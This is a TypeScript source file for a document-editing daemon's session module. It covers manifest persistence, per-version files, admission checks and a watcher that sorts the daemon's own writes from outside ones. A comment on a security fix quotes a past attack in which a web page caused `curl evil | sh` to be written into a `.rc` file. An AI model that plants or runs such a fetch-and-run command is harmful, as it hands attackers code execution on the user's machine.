/**
 * The session — the daemon's state, and the only code that writes a file.
 *
 * E8's shape, the house's "materialized path" pattern: the daemon owns the
 * session (context, docs, versions, which is active, the chat) and persists it
 * as `manifest.json`; every version's TEXT is a file in the session folder, so
 * the agent edits versions with its own file tools.
 *
 *     $SCRIPTORIUM_HOME/sessions/<sessionId>/
 *       manifest.json              written atomically, on every change
 *       docs/<slug>/v1.md, v2.md   one file per version
 *
 * The three write rules, each a decision rather than a habit:
 *
 * - **The original is written ONLY by `save`** (E7). Opening copies it to v1;
 *   nothing else touches it.
 * - **Every write this module makes is remembered by content hash** (the
 *   `owned` map) so the watcher can tell the daemon's own writes from anyone
 *   else's (investigation §5). A write to the ACTIVE version that is not ours
 *   is an E2 violation the daemon announces.
 * - **The agent never writes the active version** (E2) — enforced socially by
 *   SKILL.md and detected here, not prevented: the file is the agent's medium.
 *
 * Nothing here knows about sockets, HTTP or the event log. The daemon calls a
 * method, gets a result, and decides what to broadcast; that split is what
 * lets the unit cells drive the whole model with a temp home.
 */

import {
  existsSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  realpathSync,
  renameSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { basename, dirname, extname, join, resolve, sep } from "node:path";
import { writeFileAtomic } from "../../kit/wire/discovery.ts";
import type {
  ChatMessage,
  ChatWho,
  ContextEntry,
  DocView,
  PublicState,
  Selection,
  Version,
  VersionAuthor,
} from "./protocol";
import { entryForPath, isDocName, locate, scanTree } from "./tree";

export const MANIFEST_FORMAT = 1;

type DocRecord = {
  slug: string;
  name: string;
  original: string;
  entryId: string | null;
  rel: string | null;
  ext: string;
  versions: Omit<Version, "path">[];
  active: number;
  /** Hash of the original as we last read or wrote it — at open, save, revert
   *  and reload — so a restore can tell that it changed while no daemon was
   *  watching (verify-pass fix 2). */
  originalHash: string;
  /** Set only by `openPath`, which admits a doc-type file INSIDE a context
   *  entry. `save` writes no original that lacks it (verify-pass fix 1c). */
  admitted?: boolean;
  outsideChanged: boolean;
};

export type Manifest = {
  format: number;
  sessionId: string;
  createdAt: number;
  context: ContextEntry[];
  docs: DocRecord[];
  openDoc: string | null;
  chat: ChatMessage[];
};

/** A refusal the daemon turns into an HTTP status — `choices` when the set is in hand (A1). */
export class SessionError extends Error {
  constructor(
    message: string,
    readonly status: 400 | 404 | 409,
    readonly choices?: string[],
  ) {
    super(message);
  }
}

export const contentHash = (text: string): string => Bun.hash(text).toString(16);

const randHex = (n: number) =>
  Array.from(crypto.getRandomValues(new Uint8Array(n)))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");

export const newSessionId = (): string => randHex(4);

/** A path's realpath, or the path itself when it cannot be resolved (gone). */
export function realOr(p: string): string {
  try {
    return realpathSync(p);
  } catch {
    return p;
  }
}

/** What a watcher event turned out to be. `null` = nothing (ours, or no change). */
export type FileEvent =
  | { kind: "version.changed"; doc: string; version: number; text: string; active: false }
  | {
      kind: "active.outside";
      doc: string;
      version: number;
      path: string;
      /** The new agent version the outside text was preserved as. */
      preservedAs: number;
      preservedPath: string;
    }
  | { kind: "version.created"; doc: string; version: number; path: string }
  | { kind: "original.reloaded"; doc: string; version: number; text: string; original: string }
  | { kind: "original.conflict"; doc: string; original: string }
  | { kind: "tree"; entryId: string };

export class Session {
  readonly dir: string;
  private m: Manifest;
  /** path → hash of the daemon's last write to it. */
  private owned = new Map<string, string>();
  /** slug → hash of the active version's current text. */
  private activeHash = new Map<string, string>();
  /** slug → the active version's text as the daemon last wrote (or adopted)
   *  it — what an outside write to the active version is reverted to. */
  private lastActiveText = new Map<string, string>();
  /** What a restore found changed on disk while no daemon was watching. */
  restoreFindings: { doc: string; original: string; missing: boolean }[] = [];

  private constructor(
    readonly home: string,
    manifest: Manifest,
  ) {
    this.m = manifest;
    this.dir = join(home, "sessions", manifest.sessionId);
  }

  static create(home: string, sessionId: string = newSessionId()): Session {
    const s = new Session(home, {
      format: MANIFEST_FORMAT,
      sessionId,
      createdAt: Date.now(),
      context: [],
      docs: [],
      openDoc: null,
      chat: [],
    });
    mkdirSync(join(s.dir, "docs"), { recursive: true });
    s.persist();
    return s;
  }

  /** Reload a session from its manifest (`open --restore <id>`). */
  static restore(home: string, sessionId: string): Session {
    const path = join(home, "sessions", sessionId, "manifest.json");
    if (!existsSync(path)) throw new SessionError(`no saved session ${sessionId}`, 404);
    const m = JSON.parse(readFileSync(path, "utf8")) as Manifest;
    if (m.format !== MANIFEST_FORMAT)
      throw new SessionError(`session ${sessionId} has manifest format ${m.format}`, 409);
    const s = new Session(home, m);
    mkdirSync(join(s.dir, "docs"), { recursive: true });
    // Mirrors are re-read, not trusted: the folder may have changed while no
    // daemon was watching it.
    for (const e of s.m.context) if (e.membership === "mirrored") s.rescan(e.id);
    for (const d of s.m.docs) {
      const p = s.versionPath(d, d.active);
      const text = existsSync(p) ? readFileSync(p, "utf8") : "";
      s.adoptActive(d, text);
      // ⛔ VERIFY-PASS FIX 2: an original changed while the session was closed
      // was invisible here, so the next Save overwrote it unannounced. The
      // manifest holds the original's hash as of the last open/save/revert/
      // reload; a different hash now is an outside change, marked exactly as a
      // live one with a dirty buffer is — asked, never merged or reloaded.
      let now: string | null = null;
      try {
        now = contentHash(readFileSync(d.original, "utf8"));
      } catch {
        now = null;
      }
      if (now === null || now !== d.originalHash) {
        d.outsideChanged = true;
        s.restoreFindings.push({ doc: d.slug, original: d.original, missing: now === null });
      }
    }
    if (s.restoreFindings.length > 0) s.persist();
    return s;
  }

  static listSaved(home: string): string[] {
    try {
      return readdirSync(join(home, "sessions")).filter((id) =>
        existsSync(join(home, "sessions", id, "manifest.json")),
      );
    } catch {
      return [];
    }
  }

  get id(): string {
    return this.m.sessionId;
  }

  get docsDir(): string {
    return join(this.dir, "docs");
  }

  get openDocSlug(): string | null {
    return this.m.openDoc;
  }

  get context(): readonly ContextEntry[] {
    return this.m.context;
  }

  /**
   * Every directory the watcher must see: the session's docs, each entry root,
   * and the REAL directory of every opened original.
   *
   * ⛔ VERIFY-PASS FIX 3: each root is watched at its REALPATH (`watch`), and
   * an event is reported under the path form the session stores (`path`). A
   * watch on a symlinked directory — a symlinked home, a symlinked folder
   * entry — or on the link's own directory for a symlinked original saw
   * nothing when the TARGET changed (FSEvents reports real paths). A symlinked
   * original is matched back to its doc by realpath in `onFileEvent`.
   */
  watchRoots(): { path: string; watch: string; recursive: boolean; entryId?: string }[] {
    const roots: { path: string; watch: string; recursive: boolean; entryId?: string }[] = [
      { path: this.docsDir, watch: realOr(this.docsDir), recursive: true },
    ];
    for (const e of this.m.context)
      roots.push({
        path: e.root,
        watch: realOr(e.root),
        recursive: e.membership === "mirrored",
        entryId: e.id,
      });
    for (const d of this.m.docs) {
      const realDir = dirname(realOr(d.original));
      if (
        !roots.some((r) => r.watch === realDir && r.recursive === false) &&
        !roots.some(
          (r) => r.recursive && (realDir === r.watch || realDir.startsWith(r.watch + sep)),
        )
      )
        roots.push({ path: realDir, watch: realDir, recursive: false });
    }
    return roots;
  }

  // ── persistence ────────────────────────────────────────────────────────

  persist(): void {
    mkdirSync(this.dir, { recursive: true });
    writeFileAtomic(join(this.dir, "manifest.json"), `${JSON.stringify(this.m, null, 2)}\n`);
  }

  private writeOwned(path: string, text: string): void {
    mkdirSync(dirname(path), { recursive: true });
    // Remember BEFORE writing: the watcher's event can arrive before this
    // function returns, and it must find the hash already there.
    this.owned.set(path, contentHash(text));
    writeFileSync(path, text);
  }

  private adoptActive(d: DocRecord, text: string): void {
    const p = this.versionPath(d, d.active);
    this.owned.set(p, contentHash(text));
    this.activeHash.set(d.slug, contentHash(text));
    this.lastActiveText.set(d.slug, text);
  }

  private writeActive(d: DocRecord, text: string): void {
    this.writeOwned(this.versionPath(d, d.active), text);
    this.activeHash.set(d.slug, contentHash(text));
    this.lastActiveText.set(d.slug, text);
  }

  /** Keep an outside write to the active version as a NEW agent version. */
  private preserveOutside(d: DocRecord, text: string): Version {
    const n = Math.max(...d.versions.map((v) => v.n)) + 1;
    const rec: Omit<Version, "path"> = {
      n,
      author: "agent",
      from: d.active,
      createdAt: Date.now(),
      label: `outside write to v${d.active}`,
    };
    d.versions.push(rec);
    this.writeOwned(this.versionPath(d, n), text);
    this.persist();
    return { ...rec, path: this.versionPath(d, n) };
  }

  /** True iff `text` at `path` is exactly what the daemon last wrote there. */
  isOwnWrite(path: string, text: string): boolean {
    return this.owned.get(path) === contentHash(text);
  }

  // ── context ────────────────────────────────────────────────────────────

  addContext(rawPath: string): { entry: ContextEntry; added: boolean } {
    const abs = resolve(rawPath);
    const probe = entryForPath(abs, `c-${randHex(3)}`);
    const same = this.m.context.find(
      (e) =>
        e.root === probe.root &&
        e.membership === probe.membership &&
        (probe.membership === "mirrored" ||
          JSON.stringify(e.nodes) === JSON.stringify(probe.nodes)),
    );
    if (same) return { entry: same, added: false };
    this.m.context.push(probe);
    this.relink();
    this.persist();
    return { entry: probe, added: true };
  }

  removeContext(id: string): void {
    const i = this.m.context.findIndex((e) => e.id === id);
    if (i < 0)
      throw new SessionError(
        `no context entry ${id}`,
        404,
        this.m.context.map((e) => e.id),
      );
    this.m.context.splice(i, 1);
    this.relink();
    this.persist();
  }

  /** Re-mirror a folder entry. Returns whether its nodes changed. */
  rescan(entryId: string): boolean {
    const e = this.m.context.find((x) => x.id === entryId);
    if (e?.membership !== "mirrored") return false;
    const { nodes, truncated } = scanTree(e.root);
    const changed =
      JSON.stringify(nodes) !== JSON.stringify(e.nodes) || !!truncated !== !!e.truncated;
    e.nodes = nodes;
    if (truncated) e.truncated = true;
    else delete e.truncated;
    if (changed) this.relink();
    return changed;
  }

  private relink(): void {
    for (const d of this.m.docs) {
      const at = locate(this.m.context, d.original);
      d.entryId = at?.entryId ?? null;
      d.rel = at?.rel ?? null;
    }
  }

  // ── documents and versions ─────────────────────────────────────────────

  private versionPath(d: DocRecord, n: number): string {
    return join(this.docsDir, d.slug, `v${n}${d.ext}`);
  }

  private docOrDie(slug?: string): DocRecord {
    const want = slug ?? this.m.openDoc ?? undefined;
    const choices = this.m.docs.map((d) => d.slug);
    if (want === undefined)
      throw new SessionError("no document is open — name one with --doc", 409, choices);
    const d = this.findDoc(want);
    if (!d) throw new SessionError(`no document "${want}" in this session`, 404, choices);
    return d;
  }

  /** A doc by slug, by original path, or by a unique original basename. */
  findDoc(key: string): DocRecord | undefined {
    const bySlug = this.m.docs.find((d) => d.slug === key);
    if (bySlug) return bySlug;
    const abs = resolve(key);
    const byPath = this.m.docs.find((d) => d.original === abs);
    if (byPath) return byPath;
    const byName = this.m.docs.filter((d) => basename(d.original) === key || d.rel === key);
    return byName.length === 1 ? byName[0] : undefined;
  }

  private versionOrDie(d: DocRecord, n: number): Omit<Version, "path"> {
    const v = d.versions.find((x) => x.n === n);
    if (!v)
      throw new SessionError(
        `${d.slug} has no v${n}`,
        404,
        d.versions.map((x) => `v${x.n}`),
      );
    return v;
  }

  private slugFor(original: string): string {
    const stem =
      basename(original, extname(original))
        .toLowerCase()
        .replace(/[^a-z0-9_-]+/g, "-")
        .replace(/^-+|-+$/g, "") || "doc";
    let slug = stem;
    for (let i = 2; this.m.docs.some((d) => d.slug === slug); i++) slug = `${stem}-${i}`;
    return slug;
  }

  /**
   * Open a document by its original's path: v1 is written from the original
   * the first time.
   *
   * ⛔ VERIFY-PASS FIX 1b — ADMISSION. Only a doc-type file INSIDE a context
   * entry is admitted; `context.add` stays the one way in. Before this, any
   * path of any type was opened, and Save then wrote it: a foreign web page
   * wrote `curl evil | sh` into a `.rc` file outside the context.
   */
  openPath(rawPath: string): { slug: string; created: boolean } {
    const abs = resolve(rawPath);
    const existing = this.m.docs.find((d) => d.original === abs);
    if (existing) {
      this.m.openDoc = existing.slug;
      this.persist();
      return { slug: existing.slug, created: false };
    }
    if (!isDocName(abs)) throw new SessionError(`not a document scriptorium opens: ${abs}`, 400);
    if (!locate(this.m.context, abs))
      throw new SessionError(
        `${abs} is not in this session's context — add it (or its folder) first`,
        400,
      );
    let text: string;
    try {
      if (!statSync(abs).isFile()) throw new Error("not a file");
      text = readFileSync(abs, "utf8");
    } catch {
      throw new SessionError(`cannot open ${abs}: no such file`, 404);
    }
    const ext = [".md", ".markdown", ".mdx", ".txt"].includes(extname(abs).toLowerCase())
      ? extname(abs).toLowerCase()
      : ".md";
    const at = locate(this.m.context, abs);
    const d: DocRecord = {
      slug: this.slugFor(abs),
      name: basename(abs),
      original: abs,
      entryId: at?.entryId ?? null,
      rel: at?.rel ?? null,
      ext,
      versions: [{ n: 1, author: "human", createdAt: Date.now() }],
      active: 1,
      originalHash: contentHash(text),
      outsideChanged: false,
      admitted: true,
    };
    this.m.docs.push(d);
    this.writeActive(d, text);
    this.m.openDoc = d.slug;
    this.persist();
    return { slug: d.slug, created: true };
  }

  openSlug(slug: string): void {
    this.m.openDoc = this.docOrDie(slug).slug;
    this.persist();
  }

  readVersion(slug: string, n: number): { text: string; path: string } {
    const d = this.docOrDie(slug);
    this.versionOrDie(d, n);
    const path = this.versionPath(d, n);
    return { text: readFileSync(path, "utf8"), path };
  }

  activePath(slug?: string): string | null {
    const d = slug ? this.findDoc(slug) : this.m.openDoc ? this.findDoc(this.m.openDoc) : undefined;
    return d ? this.versionPath(d, d.active) : null;
  }

  /** The human's buffer reaches the ACTIVE version's file (debounced by the surface). */
  /**
   * ⛔ VERIFY-PASS FIX 4 — CHECK BEFORE WRITE. Before the human's edit is
   * written, the file on disk is hashed: if it is not the daemon's own last
   * write, someone else wrote the active version (E2). That text is kept as a
   * NEW agent version, and only then is the edit written. Detection used to
   * depend on the watcher's 60 ms settle timer firing before the next
   * keystroke; a burst of edits at 30 ms clobbered an outside write
   * unannounced. Now nothing is lost whatever the timing — the one window left
   * is the microseconds between this read and this write.
   */
  edit(
    slug: string,
    n: number,
    text: string,
  ): { dirtyChanged: boolean; preserved: Version | null } {
    const d = this.docOrDie(slug);
    if (n !== d.active)
      throw new SessionError(
        `v${n} is not the active version of ${d.slug} (v${d.active} is) — only the active version is editable`,
        409,
      );
    const before = this.isDirty(d);
    const path = this.versionPath(d, n);
    // The edit is staged in a sibling file FIRST, so the check below and the
    // rename that lands the edit are adjacent syscalls: the window in which an
    // outside write could slip between them is microseconds, not the length of
    // a multi-megabyte write — and a write landing AFTER the rename goes to the
    // new file, where the watcher finds it and preserves it too.
    const staged = `${path}.${process.pid}.edit`;
    writeFileSync(staged, text);
    let preserved: Version | null = null;
    let onDisk: string | null = null;
    try {
      onDisk = readFileSync(path, "utf8");
    } catch {
      onDisk = null;
    }
    if (onDisk !== null && !this.isOwnWrite(path, onDisk))
      preserved = this.preserveOutside(d, onDisk);
    this.owned.set(path, contentHash(text));
    renameSync(staged, path);
    this.activeHash.set(d.slug, contentHash(text));
    this.lastActiveText.set(d.slug, text);
    return { dirtyChanged: before !== this.isDirty(d), preserved };
  }

  /** Copy a version to a new file; the agent then edits that file with its own tools. */
  newVersion(opts: { doc?: string; from?: number; label?: string; author: VersionAuthor }): {
    slug: string;
    version: Version;
  } {
    const d = this.docOrDie(opts.doc);
    const from = opts.from ?? d.active;
    this.versionOrDie(d, from);
    const text = readFileSync(this.versionPath(d, from), "utf8");
    const n = Math.max(...d.versions.map((v) => v.n)) + 1;
    const rec: Omit<Version, "path"> = {
      n,
      author: opts.author,
      from,
      createdAt: Date.now(),
      ...(opts.label ? { label: opts.label } : {}),
    };
    d.versions.push(rec);
    this.writeOwned(this.versionPath(d, n), text);
    this.persist();
    return { slug: d.slug, version: { ...rec, path: this.versionPath(d, n) } };
  }

  activate(opts: { doc?: string; version: number }): { slug: string; previous: number } {
    const d = this.docOrDie(opts.doc);
    this.versionOrDie(d, opts.version);
    const previous = d.active;
    d.active = opts.version;
    // The new active version's text AS IT IS NOW is the baseline the next
    // check-before-write compares against.
    this.adoptActive(d, readFileSync(this.versionPath(d, d.active), "utf8"));
    this.persist();
    return { slug: d.slug, previous };
  }

  /** Save: the active version's text over the original. The ONLY write to it (E7). */
  save(slug: string): { original: string; version: number } {
    const d = this.docOrDie(slug);
    // ⛔ VERIFY-PASS FIX 1c: Save writes only an original admitted by
    // `openPath` (a doc-type file inside a context entry). Checked again here
    // so no other path into the manifest — a hand-edited one, a future verb —
    // can turn Save into "write any file".
    if (!d.admitted || !isDocName(d.original))
      throw new SessionError(
        `refusing to save ${d.original}: it was not opened from the context`,
        409,
      );
    const text = readFileSync(this.versionPath(d, d.active), "utf8");
    this.writeOwned(d.original, text);
    d.originalHash = contentHash(text);
    d.outsideChanged = false;
    this.persist();
    return { original: d.original, version: d.active };
  }

  /** Revert: the original's text back over the active version. */
  revert(slug: string): { version: number; text: string } {
    const d = this.docOrDie(slug);
    const text = readFileSync(d.original, "utf8");
    d.originalHash = contentHash(text);
    d.outsideChanged = false;
    this.writeActive(d, text);
    this.persist();
    return { version: d.active, text };
  }

  private isDirty(d: DocRecord): boolean {
    return (this.activeHash.get(d.slug) ?? "") !== d.originalHash;
  }

  // ── the watcher's question: whose write was that? ───────────────────────

  /**
   * Classify one filesystem event. Reads the file; returns `null` when it is
   * the daemon's own write, unchanged, gone, or not ours to care about.
   */
  onFileEvent(abs: string): FileEvent | null {
    // A version file under docs/<slug>/vN.ext?
    if (abs.startsWith(this.docsDir + sep)) {
      const rest = abs.slice(this.docsDir.length + 1).split(sep);
      if (rest.length !== 2) return null;
      const [slug, file] = rest as [string, string];
      const d = this.m.docs.find((x) => x.slug === slug);
      const match = /^v(\d+)(\.[a-z]+)$/.exec(file);
      if (!d || !match || match[2] !== d.ext) return null;
      const n = Number(match[1]);
      let text: string;
      try {
        text = readFileSync(abs, "utf8");
      } catch {
        return null;
      }
      if (this.isOwnWrite(abs, text)) return null;
      if (!d.versions.some((v) => v.n === n)) {
        // The agent wrote a version file by hand rather than through
        // `version-new` — adopt it rather than leave a file the surface cannot see.
        d.versions.push({ n, author: "agent", createdAt: Date.now() });
        d.versions.sort((a, b) => a.n - b.n);
        this.owned.set(abs, contentHash(text));
        this.persist();
        return { kind: "version.created", doc: d.slug, version: n, path: abs };
      }
      if (n === d.active) {
        // E2, refused and RE-LABELLED: the outside text becomes a new agent
        // version, and the active version goes back to the daemon's own last
        // text — so the active version only ever holds what the human typed,
        // and nothing anyone wrote is lost (verify-pass fix 4, watcher half).
        const kept = this.preserveOutside(d, text);
        this.writeActive(d, this.lastActiveText.get(d.slug) ?? text);
        return {
          kind: "active.outside",
          doc: d.slug,
          version: n,
          path: abs,
          preservedAs: kept.n,
          preservedPath: kept.path,
        };
      }
      this.owned.set(abs, contentHash(text));
      return { kind: "version.changed", doc: d.slug, version: n, text, active: false };
    }

    // An opened original — by its stored path, or by realpath for a symlink?
    const d = this.m.docs.find((x) => x.original === abs || realOr(x.original) === abs);
    if (d) {
      let text: string;
      try {
        text = readFileSync(abs, "utf8");
      } catch {
        return null;
      }
      const h = contentHash(text);
      if (h === d.originalHash) return null; // our own save, or no change
      const clean = !this.isDirty(d);
      if (clean) {
        d.originalHash = h;
        this.writeActive(d, text);
        this.persist();
        return {
          kind: "original.reloaded",
          doc: d.slug,
          version: d.active,
          text,
          original: d.original,
        };
      }
      if (d.outsideChanged) return null; // already asked
      d.outsideChanged = true;
      this.persist();
      return { kind: "original.conflict", doc: d.slug, original: d.original };
    }

    // Something under a mirrored root: the tree may have changed.
    for (const e of this.m.context) {
      if (e.membership === "mirrored" && (abs === e.root || abs.startsWith(e.root + sep))) {
        return this.rescan(e.id) ? { kind: "tree", entryId: e.id } : null;
      }
    }
    return null;
  }

  // ── chat ───────────────────────────────────────────────────────────────

  addMessage(
    who: ChatWho,
    text: string,
    extra: { selection?: Selection | null; activePath?: string | null } = {},
  ): ChatMessage {
    const msg: ChatMessage = { id: `m-${randHex(4)}`, who, text, ts: Date.now(), ...extra };
    this.m.chat.push(msg);
    this.persist();
    return msg;
  }

  // ── views ──────────────────────────────────────────────────────────────

  docView(d: DocRecord): DocView {
    return {
      slug: d.slug,
      name: d.name,
      original: d.original,
      entryId: d.entryId,
      rel: d.rel,
      versions: d.versions.map((v) => ({ ...v, path: this.versionPath(d, v.n) })),
      active: d.active,
      dirty: this.isDirty(d),
      outsideChanged: d.outsideChanged,
    };
  }

  doc(slug: string): DocView {
    return this.docView(this.docOrDie(slug));
  }

  view(mode: "dev" | "release", selection: Selection | null): PublicState {
    return {
      sessionId: this.m.sessionId,
      home: this.home,
      mode,
      context: this.m.context,
      docs: this.m.docs.map((d) => this.docView(d)),
      openDoc: this.m.openDoc,
      selection,
      chat: this.m.chat,
    };
  }
}
